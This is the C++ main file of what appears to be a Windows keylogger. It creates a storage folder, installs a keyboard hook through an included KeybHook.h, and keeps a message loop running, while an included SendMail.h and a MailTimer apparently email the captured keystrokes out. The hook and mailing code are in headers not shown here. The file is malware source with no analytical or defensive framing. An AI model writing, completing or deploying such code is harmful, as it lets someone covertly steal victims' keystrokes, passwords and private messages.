#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Timer.h"
#include "KeyConstants.h"
#include "Base64.h"
#include "IO.h"
#include "SendMail.h"
#include "KeybHook.h"

using namespace std;

int main()
{
    MSG Msg;

    IO::MkDir(IO::GetOurPath(true));

    InstallHook();

    while(GetMessage (&Msg,NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();


    return 0;
}
